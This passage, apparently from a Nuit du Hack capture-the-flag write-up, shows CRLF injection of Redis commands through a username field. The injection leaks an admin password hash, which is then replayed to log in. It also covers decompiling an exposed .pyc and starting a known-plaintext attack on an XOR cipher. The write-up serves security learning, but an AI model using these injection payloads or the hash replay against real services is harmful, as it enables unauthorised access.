<span class="code-line"><span class="k">[</span><span class="c">!</span><span class="k">]</span><span class="c"> Authentification Error : Valid response code but no user data received : </span><span class="nb">-</span><span class="c">ERR Protocol error: unbalanced quotes in request</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Bad password or authentification error</span><span class="nt">...</span><span class="c"> !</span></span>
<span class="code-line"></code></pre></div>

<h3 id="redis">Redis</h3>
<p>The error <code>unbalanced quotes in request</code> seems to be from a Redis server, a
NoSQL engine. We can see this precise error in the
<a href="http://download.redis.io/redis-stable/src/networking.c"><code>networking.c</code></a> file
of the project.</p>
<p>We replace the username with <code>admin\x0A\x0D</code> in order to finish the command and
obtain :</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">spl3en@box:~$ python SecureAuthClient</span><span class="nt">.</span><span class="c">py</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Server sent challenge : OFJUOFLbDdR49FHeNMUH4FX7VFIUPxiASDKIaXpZvtIELU3Yo333ICcUmIZFfVWB !</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Auth data : AUTH username |e72fd1858578774bfbee00196992db55f7697833746053a2390a73f4616c60da</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Sending auth packet</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Welcome </span><span class="nb">-</span><span class="c">ERR unknown command &#39;:name&#39; we are verifying your password</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Bad password or authentification error</span><span class="nt">...</span><span class="c"> !</span></span>
<span class="code-line"></code></pre></div>

<p>We notice the prefix <code>:name</code> which have been interpreted as a second command.</p>
<h3 id="command-injection">Command injection</h3>
<p>We try to inject <a href="http://redis.io/commands">Redis commands</a> like <code>INFO</code> by
replacing the username with <code>admin\x0A\x0DINFO\x0A\x0D</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">spl3en@box:~$ python SecureAuthClient</span><span class="nt">.</span><span class="c">py</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Server sent challenge : JrLFTYYrDxYibypIBzkdmALAzDCoYe9olBMEZ2OXEDuqsrFFISLzLhWMkeFOdRCB !</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Auth data : AUTH admin</span></span>
<span class="code-line"><span class="c">INFO</span></span>
<span class="code-line"><span class="c">|30247cdea2397657332d6f35b4c2a4340b83e3a842a17119704f31185a41cbe3</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Sending auth packet</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Welcome </span><span class="nb">-</span><span class="c">ERR unknown command &#39;INFO&#39; we are verifying your password</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Bad password or authentification error</span><span class="nt">...</span><span class="c"> !</span></span>
<span class="code-line"></code></pre></div>

<p>The <code>INFO</code> commend is not recognize. After several tests, we see that all
commands but <code>GET</code> seems filtrated. We suppose that the one used to get the
username and the password in the NoSQL database. With </p>
<p>The requests on the server should be something like:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>username = GET &lt;user&gt;:name</span>
<span class="code-line">password = GET &lt;user&gt;:password</span>
<span class="code-line"></code></pre></div>

<p>We try to inject <code>admin:password\x0A\x0D</code> in the username, that will give us:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>username = GET admin:password\x0A\x0D:name</span>
<span class="code-line">password = GET admin:password\x0A\x0D:password</span>
<span class="code-line"></code></pre></div>

<p>(The name and password at the end of each line would not be interpreted).</p>
<p>We execute the program with <code>admin:password\x0A\x0D</code> as a username:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">spl3en@box:~$ python SecureAuthClient</span><span class="nt">.</span><span class="c">py</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Server sent challenge : DsHn1UJH7LjPSpVOIuZwh7QUgEZ1qGXnK8sHxBYnSTsaWNdVYDvHG5UCPTrvL2AJ !</span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Auth data : AUTH admin:password</span></span>
<span class="code-line"><span class="c">|606611cc808eabd5e38bed8e21360b52127f3e2cecbf02413c3da90fa43c71a3</span></span>
<span class="code-line"><span class="k">[</span><span class="c">~</span><span class="k">]</span><span class="c"> Sending auth packet</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"><span class="k">[</span><span class="nb">+</span><span class="k">]</span><span class="c"> Welcome 837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529 we are verifying your password</span><span class="nt">...</span><span class="c"></span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Bad password or authentification error</span><span class="nt">...</span><span class="c"> !</span></span>
<span class="code-line"></code></pre></div>

<p>As excepted the server show us the username that we replace by its hashed
password. We get the <code>sha256(admin_passwd)</code>:
<code>837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529</code>.</p>
<p>We replace the corresponding python code to directly send the hash:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">packet</span> <span class="o">=</span> <span class="s2">&quot;AUTH </span><span class="si">%s</span><span class="s2">|</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">sha256</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">authtoken</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">+</span> <span class="n">challenge</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span></span>
<span class="code-line"></code></pre></div>

<p>Become:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">packet</span> <span class="o">=</span> <span class="s2">&quot;AUTH </span><span class="si">%s</span><span class="s2">|</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">sha256</span><span class="p">(</span><span class="s2">&quot;837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529&quot;</span> <span class="o">+</span> <span class="n">challenge</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span></span>
<span class="code-line"></code></pre></div>

<p>We execute the script:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">spl3en</span><span class="nv">@box</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">SecureAuthClient</span><span class="p">.</span><span class="n">py</span><span class="w"></span></span>
<span class="code-line"><span class="o">[</span><span class="n">~</span><span class="o">]</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="n">sent</span><span class="w"> </span><span class="n">challenge</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">elQQpNHPDlDk1FO9RUiqDfUyUBRpFGMJ5NuBkGTGnGVYW9SCRluSYlcNQnJYkSHP</span><span class="w"> </span><span class="err">!</span><span class="w"></span></span>
<span class="code-line"><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Auth</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">AUTH</span><span class="w"> </span><span class="k">admin</span><span class="err">:</span><span class="n">password</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="mi">8</span><span class="n">baf1cc43bbe6316ed5959cd8efd2fd8f23d9bae441d4a8134277cd973fcaec4</span><span class="w"></span></span>
<span class="code-line"><span class="o">[</span><span class="n">~</span><span class="o">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="n">packet</span><span class="p">...</span><span class="w"></span></span>
<span class="code-line"><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Welcome</span><span class="w"> </span><span class="mi">837</span><span class="n">a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">verifying</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">password</span><span class="p">...</span><span class="w"></span></span>
<span class="code-line"></span>
<span class="code-line"><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Congrats</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="o">*</span><span class="n">INSERT_FUNNY_QUOTE_HERE</span><span class="o">*</span><span class="w"></span></span>
<span class="code-line"></code></pre></div>

<p><strong>Flag: *INSERT_FUNNY_QUOTE_HERE*</strong></p>
<h1 id="updator">Updator</h1>
<p>Exploit  |  200 points  |  http://quals.nuitduhack.com/challenges/view/9</p>
<p>http://updator.challs.nuitduhack.com/</p>
<h2 id="statement_3">Statement</h2>
<p>*Unhackable : "Not hackable; that cannot be hacked or broken into."</p>
<p>We manage updates and thus have fixes, this is not a PS3 as it is unhackable…
or is it?*</p>
<h2 id="challenge_3">Challenge</h2>
<p>The website is a simple page with a login interface for witch we do not have any
credentials and a <strong>Update</strong> button.
When clicking on the button we got the following message from the page
http://updator.challs.nuitduhack.com/update.py:
<em>The update managing system is still under construction but will be available soon.</em></p>
<h3 id="robotstxt">robots.txt</h3>
<p>The file <code>robots.txt</code> reveal the folder temp/:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">Disallow</span><span class="o">:</span><span class="w"> </span><span class="n">temp</span><span class="o">/*</span><span class="w"></span></span>
<span class="code-line"></code></pre></div>

<p>In this folder we found a file <code>log.py.encrypted</code>. How can we decipher it ?</p>
<h3 id="pyc">pyc</h3>
<p>The <strong>Update</strong> button call a <code>update.py</code> file therefor we can try for the
compiled version of it with the .pyc extension as confirmed by the page
http://updator.challs.nuitduhack.com/update.pyc</p>
<p>We must decompile this file, we will use
<a href="https://github.com/wibiti/uncompyle2">uncompyle2</a>. The output is the following
python program:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">config</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">sys</span></span>
<span class="code-line"><span class="n">KEY</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">KEY</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span></span>
<span class="code-line">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span></span>
<span class="code-line">    <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span></span>
<span class="code-line">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span></span>
<span class="code-line">    <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span></span>
<span class="code-line">        <span class="n">cipher</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">arg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">))</span> <span class="p">])</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">return</span> <span class="n">cipher</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">class</span> <span class="nc">Crypto</span><span class="p">:</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="nd">@staticmethod</span></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">file</span><span class="p">):</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">content</span> <span class="o">=</span> <span class="n">fd</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line">        <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">),</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span> <span class="n">content</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">:(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="p">]</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">.encrypted&#39;</span> <span class="o">%</span> <span class="n">file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">encrypted</span> <span class="o">=</span> <span class="p">[]</span></span>
<span class="code-line">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">blocks</span><span class="p">)):</span></span>
<span class="code-line">                <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span></span>
<span class="code-line">                    <span class="n">encrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span></span>
<span class="code-line">                <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">                    <span class="n">encrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span></span>
<span class="code-line"></span>
<span class="code-line">            <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">encrypted</span><span class="p">))</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="nd">@staticmethod</span></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">file</span><span class="p">):</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">content</span> <span class="o">=</span> <span class="n">fd</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line">        <span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span> <span class="n">content</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">:(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="p">]</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">plain</span> <span class="o">=</span> <span class="p">[]</span></span>
<span class="code-line">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">blocks</span><span class="p">)):</span></span>
<span class="code-line">                <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span></span>
<span class="code-line">                    <span class="n">plain</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span></span>
<span class="code-line">                <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">                    <span class="n">plain</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">blocks</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span></span>
<span class="code-line"></span>
<span class="code-line">            <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">))</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="nb">print</span> <span class="s1">&#39;Content-Type: text/html&#39;</span></span>
<span class="code-line"><span class="nb">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&lt;!DOCTYPE html&gt;</span><span class="se">\n</span><span class="s1">&lt;html&gt;</span><span class="se">\n</span><span class="s1">  &lt;head&gt;</span><span class="se">\n</span><span class="s1">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><span class="se">\n</span><span class="s1">    &lt;title&gt;Updator - Update system&lt;/title&gt;</span><span class="se">\n</span><span class="s1">    &lt;link rel=&quot;stylesheet&quot; href=&quot;static/font-awesome/css/font-awesome.css&quot;&gt;</span><span class="se">\n</span><span class="s1">    &lt;link rel=&quot;stylesheet&quot; href=&quot;static/css/style.css&quot;&gt;</span><span class="se">\n</span><span class="s1">  &lt;/head&gt;</span><span class="se">\n</span><span class="s1">  &lt;body&gt;</span><span class="se">\n</span><span class="s1">    &lt;div id=&quot;info&quot;&gt;</span><span class="se">\n</span><span class="s1">      The update managing system is still under construction but will be available soon.</span><span class="se">\n</span><span class="s1">    &lt;/div&gt;</span><span class="se">\n</span><span class="s1">  &lt;/body&gt;</span><span class="se">\n</span><span class="s1">&lt;/html&gt;</span><span class="se">\n</span><span class="s1">&#39;</span></span>
<span class="code-line"><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span></span>
<span class="code-line"></code></pre></div>

<h3 id="the-private-key">The private key</h3>
<p>We know the algorithm use to encrypt the <code>log.py.encypted</code> file: a XOR cipher by
bloc of 8 characters where the preceding bloc is also XOR with the current one.
We just need the key. Bruteforcing 8 characters will be too long, we need an
other method. The <code>log.py.encypted</code> file being python code will probably start
by something like <code>import sys</code>.</p>
<p>First of all lets take a closer look to <code>log.py.encrypted</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">maggick@rootine updator</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">hexdump</span><span class="w"> </span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="nf">log</span><span class="p">.</span><span class="n">py</span><span class="p">.</span><span class="n">encrypted</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000000</span><span class="w">  </span><span class="mi">5</span><span class="n">f</span><span class="w"> </span><span class="mi">36</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">0</span><span class="n">b</span><span class="w"> </span><span class="mi">03</span><span class="w"> </span><span class="mi">56</span><span class="w"> </span><span class="mi">06</span><span class="w"> </span><span class="mi">17</span><span class="w">  </span><span class="mi">08</span><span class="w"> </span><span class="mi">19</span><span class="w"> </span><span class="mi">15</span><span class="w"> </span><span class="mi">1</span><span class="n">b</span><span class="w"> </span><span class="mi">1</span><span class="n">b</span><span class="w"> </span><span class="mi">19</span><span class="w"> </span><span class="mi">45</span><span class="w"> </span><span class="mi">6</span><span class="n">e</span><span class="w">  </span><span class="o">|</span><span class="n">_60</span><span class="p">..</span><span class="n">V</span><span class="p">........</span><span class="n">En</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000010</span><span class="w">  </span><span class="mi">34</span><span class="w"> </span><span class="mi">0</span><span class="n">e</span><span class="w"> </span><span class="mi">1</span><span class="n">a</span><span class="w"> </span><span class="mi">38</span><span class="w"> </span><span class="mi">35</span><span class="w"> </span><span class="mi">7</span><span class="n">f</span><span class="w"> </span><span class="mi">2</span><span class="n">a</span><span class="w"> </span><span class="mi">4</span><span class="n">f</span><span class="w">  </span><span class="mi">22</span><span class="w"> </span><span class="mi">68</span><span class="w"> </span><span class="mi">7</span><span class="n">a</span><span class="w"> </span><span class="mi">7</span><span class="n">b</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="mi">6</span><span class="n">b</span><span class="w"> </span><span class="mi">4</span><span class="n">f</span><span class="w">  </span><span class="o">|</span><span class="mf">4..85</span><span class="p">.</span><span class="o">*</span><span class="n">O</span><span class="ss">&quot;hz{(2kO|</span></span>
<span class="code-line"><span class="ss">00000020  33 39 30 7c 35 71 3e 4f  25 2e 1f 7f 23 36 6a 14  |390|5q&gt;O%...#6j.|</span></span>
<span class="code-line"><span class="ss">00000030  3a 4f 55 11 72 34 6c 47  4c 67 61 14 77 7f 29 59  |:OU.r4lGLga.w.)Y|</span></span>
<span class="code-line"><span class="ss">00000040  1f 48 49 1f 62 57 2f 0a  09 33 6d 1e 75 55 65 16  |.HI.bW/..3m.uUe.|</span></span>
<span class="code-line"><span class="ss">00000050  58 40 58 09 61 05 2d 04  03 7e 34 4d 60 46 78 04  |X@X.a.-..~4M`Fx.|</span></span>
<span class="code-line"><span class="ss">00000060  42 4a 06 4d 38 5e 54 57  54 31 66 09 69 5c 52 46  |BJ.M8^TWT1f.i\RF|</span></span>
<span class="code-line"><span class="ss">00000070  03 19 43 03 79 13 11 15  08 62 24 42 7b 1e 12 15  |..C.y....b$B{...|</span></span>
<span class="code-line"><span class="ss">00000080  61 1c 17 01 2a 19 14 4e  1b 08 10 3a 1f 72 60 11  |a...*..N...:.r`.|</span></span>
<span class="code-line"><span class="ss">00000090  0d 20 24 2c 46 34 27 16  5e 0f 0d 25 52 38 65 04  |. $,F4&#39;.^..%R8e.|</span></span>
<span class="code-line"><span class="ss">000000a0  1c 31 63 35 4c 7e 22 0e  02 43 0a 7d 1d 29 77 18  |.1c5L~&quot;</span><span class="p">..</span><span class="n">C</span><span class="p">.</span><span class="err">}</span><span class="p">.)</span><span class="n">w</span><span class="p">.</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">000000</span><span class="n">b0</span><span class="w">  </span><span class="mi">46</span><span class="w"> </span><span class="mi">76</span><span class="w"> </span><span class="mi">2</span><span class="n">b</span><span class="w"> </span><span class="mi">74</span><span class="w"> </span><span class="mi">09</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="mi">5</span><span class="n">b</span><span class="w"> </span><span class="mi">4</span><span class="n">b</span><span class="w">  </span><span class="mi">50</span><span class="w"> </span><span class="mi">0</span><span class="n">d</span><span class="w"> </span><span class="mi">4</span><span class="n">b</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">58</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">5</span><span class="n">d</span><span class="w"> </span><span class="mi">4</span><span class="n">f</span><span class="w">  </span><span class="o">|</span><span class="n">Fv</span><span class="o">+</span><span class="n">t</span><span class="p">.</span><span class="ss">&quot;[KP.K0X ]O|</span></span>
<span class="code-line"><span class="ss">000000c0  0f 22 63 74 46 72 1e 52  11 1b 42 63 52 3e 59 4c  |.&quot;</span><span class="n">ctFr</span><span class="p">.</span><span class="n">R</span><span class="p">..</span><span class="n">BcR</span><span class="o">&gt;</span><span class="n">YL</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">000000</span><span class="n">d0</span><span class="w">  </span><span class="mi">42</span><span class="w"> </span><span class="mi">6</span><span class="n">c</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">42</span><span class="w"> </span><span class="mi">37</span><span class="w"> </span><span class="mi">58</span><span class="w"> </span><span class="mi">16</span><span class="w">  </span><span class="mi">54</span><span class="w"> </span><span class="mi">56</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="mi">55</span><span class="w"> </span><span class="mi">71</span><span class="w"> </span><span class="mi">44</span><span class="w"> </span><span class="mi">6</span><span class="n">f</span><span class="w">  </span><span class="o">|</span><span class="n">Bl</span><span class="err">&quot;</span><span class="w"> </span><span class="n">B7X</span><span class="p">.</span><span class="n">TV</span><span class="p">.</span><span class="n">dUqDo</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mf">000000e0</span><span class="w">  </span><span class="mi">42</span><span class="w"> </span><span class="mi">2</span><span class="n">d</span><span class="w"> </span><span class="mi">71</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">04</span><span class="w"> </span><span class="mi">73</span><span class="w"> </span><span class="mi">42</span><span class="w"> </span><span class="mi">3</span><span class="n">c</span><span class="w">  </span><span class="mi">54</span><span class="w"> </span><span class="mi">56</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="mi">35</span><span class="w"> </span><span class="mi">4</span><span class="n">a</span><span class="w"> </span><span class="mi">38</span><span class="w">  </span><span class="o">|</span><span class="n">B</span><span class="o">-</span><span class="n">q</span><span class="w"> </span><span class="p">.</span><span class="n">sB</span><span class="o">&lt;</span><span class="n">TV</span><span class="p">.</span><span class="n">d</span><span class="mf">.5</span><span class="n">J8</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">000000</span><span class="n">f0</span><span class="w">  </span><span class="mi">10</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">65</span><span class="w"> </span><span class="mi">4</span><span class="n">a</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">37</span><span class="w"> </span><span class="mi">6</span><span class="n">e</span><span class="w">  </span><span class="mi">55</span><span class="w"> </span><span class="mi">62</span><span class="w"> </span><span class="mi">45</span><span class="w"> </span><span class="mi">4</span><span class="n">d</span><span class="w"> </span><span class="mi">54</span><span class="w"> </span><span class="mi">75</span><span class="w"> </span><span class="mi">78</span><span class="w"> </span><span class="mi">73</span><span class="w">  </span><span class="o">|</span><span class="p">.</span><span class="n">d</span><span class="o">%</span><span class="n">eJ07nUbEMTuxs</span><span class="o">|</span><span class="w"></span></span>
